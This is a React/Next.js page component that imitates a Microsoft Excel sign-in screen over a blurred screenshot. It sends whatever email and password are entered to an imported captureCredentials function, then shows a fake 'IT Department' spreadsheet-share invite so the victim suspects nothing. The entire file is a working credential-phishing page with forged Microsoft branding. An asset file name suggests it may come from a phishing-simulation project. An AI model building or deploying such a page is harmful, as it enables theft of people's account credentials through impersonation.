'use client';
import { FormEvent, useState } from 'react';
import { captureCredentials } from '@/ai/flows/capture-credentials';
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogFooter,
  AlertDialogAction,
} from '@/components/ui/alert-dialog';

const SpreadsheetInvite = () => {
  return (
    <div className="spreadsheet-invite-container">
      <div className="logo">
        <img
          src="https://dummyimage.com/150x40/00b3b3/ffffff&text=Trellissoft.AI"
          alt="Trellissoft.AI"
        />
      </div>

      <h2>IT Department invited you to edit a Spreadsheet</h2>

      <p>Here's the Spreadsheet that IT Department shared with you.</p>

      <div className="file-box">
        <span>📄</span> Update of Asset Details as per New System Policy
      </div>

      <p className="note">
        🔒 This invite will only work for you and people with existing access.
      </p>

      <footer>
        <div className="footer-logo">
          <img
            src="https://dummyimage.com/80x20/00b3b3/ffffff&text=Trellissoft"
            alt="Trellissoft logo"
          />
          <span>Trellissoft.AI</span>
        </div>
        <p>
          This email is generated through Trellissoft’s use of Microsoft 365 and
          may contain content that is controlled by Trellissoft.
        </p>
      </footer>
    </div>
  );
};

export default function Home() {
  const imageUrl =
    'https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg';

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isSignedIn, setIsSignedIn] = useState(false);

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    await captureCredentials({ username, password });
    setIsSignedIn(true);
  };

  return (
    <>
      <style jsx global>{`
        .spreadsheet-invite-container {
          background-color: #2b2b2b;
          border: 1px solid #3a3a3a;
          border-radius: 8px;
          width: 480px;
          padding: 30px;
          text-align: center;
          box-shadow: 0 0 15px rgba(0,0,0,0.3);
          color: #e0e0e0;
        }
        .spreadsheet-invite-container .logo {
          margin-bottom: 10px;
        }
        .spreadsheet-invite-container .logo img {
          height: 40px;
        }
        .spreadsheet-invite-container h2 {
          font-size: 18px;
          margin: 15px 0;
          color: #ffffff;
        }
        .spreadsheet-invite-container p {
          font-size: 14px;
          color: #cccccc;
        }
        .spreadsheet-invite-container .file-box {
          background-color: #1a1a1a;
          border: 1px solid #444;
          border-radius: 6px;
          padding: 10px;
          margin: 20px 0;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: 500;
        }
        .spreadsheet-invite-container .file-box span {
          color: #f1c40f;
          margin-right: 5px;
        }
        .spreadsheet-invite-container .note {
          font-size: 12px;
          color: #b5b5b5;
          margin-bottom: 20px;
        }
        .spreadsheet-invite-container .btn, .alert-dialog-footer .btn {
          background-color: #0078d7;
          color: white;
          border: none;
          padding: 10px 24px;
          border-radius: 4px;
          cursor: pointer;
          font-size: 14px;
          margin: 5px;
          transition: background 0.3s;
        }
        .spreadsheet-invite-container .btn:hover, .alert-dialog-footer .btn:hover {
          background-color: #005fa3;
        }
        .spreadsheet-invite-container footer {
          border-top: 1px solid #333;
          margin-top: 25px;
          padding-top: 10px;
          font-size: 11px;
          color: #888;
        }
        .spreadsheet-invite-container .footer-logo {
          display: flex;
          align-items: center;
          justify-content: center;
          margin-bottom: 5px;
        }
        .spreadsheet-invite-container .footer-logo img {
          height: 18px;
          margin-right: 6px;
        }
        .alert-dialog-content {
           background-color: #2b2b2b !important;
           border: 1px solid #3a3a3a !important;
           max-width: fit-content !important;
        }
      `}</style>

      {/* Blurred Image */}
      <img id="blurredImage" src={imageUrl} alt="Blurred screenshot" />

      {/* Login Overlay */}
      <div
        className="login-overlay"
        role="main"
        aria-label="Excel Login Screen"
      >
        <h2>Sign in to Excel</h2>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            name="username"
            placeholder="Email or phone"
            autoComplete="username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            autoComplete="current-password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit">Sign in</button>
          <small>© Microsoft Corporation</small>
        </form>
      </div>

      <AlertDialog open={isSignedIn} onOpenChange={setIsSignedIn}>
        <AlertDialogContent className="alert-dialog-content">
          <SpreadsheetInvite />
          <AlertDialogFooter className="alert-dialog-footer sm:justify-center">
            <AlertDialogAction className="btn">Open</AlertDialogAction>
            <AlertDialogAction className="btn">Share</AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </>
  );
}
